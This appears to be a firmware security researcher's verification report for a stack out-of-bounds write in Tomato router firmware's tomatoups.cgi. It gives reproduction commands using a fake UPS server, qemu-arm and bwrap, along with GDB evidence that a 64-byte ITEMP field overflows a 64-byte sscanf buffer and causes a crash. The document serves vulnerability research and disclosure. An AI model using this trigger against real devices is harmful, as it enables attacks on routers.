# D-001 Verified: `upstemp` 0x40 stack overwrite

## Setup

- Binary: `/home/kali/Desktop/firmware-CNVD/_firmware_runtime/unpacked/tomato/9ad48d5b61db7b4296578c7df6b7c09924d5290d.trx/www/apcupsd/tomatoups.cgi`
- Rootfs: `/home/kali/Desktop/firmware-CNVD/_firmware_runtime/unpacked/tomato/9ad48d5b61db7b4296578c7df6b7c09924d5290d.trx`
- Case config: `/home/kali/Desktop/firmware-CNVD/_firmware_runtime_cases/D-001/apcupsd_min_upstemp`
- Query string: `host=127.0.0.1&refresh=1`
- Fake UPS payload: `DATE=16 bytes`, `ITEMP=64 bytes of 'A'`

## Repro

Terminal A:

```bash
python3 "/home/kali/Desktop/firmware-CNVD/target_binaries/_analysis/validated_cases/tomatoups/9ad48d5b61db7b4296578c7df6b7c09924d5290d/d001_multi_field_server.py" \
  --host 127.0.0.1 --port 3551 --date-pad 16 --pad 64 --max-clients 2
```

Terminal B:

```bash
ROOTFS="/home/kali/Desktop/firmware-CNVD/_firmware_runtime/unpacked/tomato/9ad48d5b61db7b4296578c7df6b7c09924d5290d.trx"
CFG="/home/kali/Desktop/firmware-CNVD/_firmware_runtime_cases/D-001/apcupsd_min_upstemp"

bwrap --tmpfs / --dir /usr --dir /usr/local \
  --ro-bind /bin /bin --ro-bind /lib /lib --ro-bind /lib64 /lib64 \
  --ro-bind /usr/bin /usr/bin --ro-bind /usr/lib /usr/lib \
  --ro-bind /etc /etc --bind /home /home --proc /proc --dev /dev --tmpfs /tmp \
  --symlink "$CFG" /usr/local/apcupsd \
  /bin/bash -lc 'QEMU_LD_PREFIX="'"$ROOTFS"'" QUERY_STRING="host=127.0.0.1&refresh=1" SERVER_PROTOCOL="HTTP/1.1" qemu-arm "'"$ROOTFS"'/www/apcupsd/tomatoups.cgi"'
```

## Evidence

- Plain QEMU run crashed with `SIGSEGV`:
  - `d001_qemu_min_config_html.out`
- Focused GDB watch script:
  - `d001_gdb_upstemp_pad64_watch.gdb`
  - `d001_gdb_upstemp_pad64_watch.log`

Key observations from `d001_gdb_upstemp_pad64_watch.log`:

1. `sub_97E0` entered with the expected 64-byte stack buffer path:
   - `0x97f8`: `r0="127.0.0.1"`, `r1="upstemp"`, `r2=<stack buf>`, `r3=0x40`
2. The sink used the real `ITEMP` line and stayed on the `%s` branch:
   - `0x914c`: source string was `ITEMP    : AAAAA...` with exactly 64 attacker-controlled `A` bytes
   - `r6=0x40`
3. `sscanf("%*s %*s %s", a3)` wrote 65 bytes into a 64-byte stack buffer:
   - After `0x9150`, `buf[0..63]` was all `0x41`
   - The byte at `buf+0x40` changed from `0x78` to `0x00`
   - Saved `r4` changed from `0x00017278` to `0x00017200`
4. The process then crashed:
   - `Program received signal SIGSEGV`
   - Crash site: `strcmp()` in target `libc.so.0`

## Conclusion

This is a verified stack out-of-bounds write in the `upstemp` 64-byte path:

- Caller: `sub_97E0`
- Sink: `sub_9068 -> 0x914c -> sscanf("%*s %*s %s", a3)`
- Constraint: `a4=0x40`
- Trigger: `ITEMP` field value length `>= 64`

Even with exactly 64 `A` bytes, the terminating NUL becomes the 65th byte and overwrites saved stack data immediately after the local buffer. The write is attacker-controlled up to the boundary and provably corrupts the stack, followed by a target-side `SIGSEGV`.
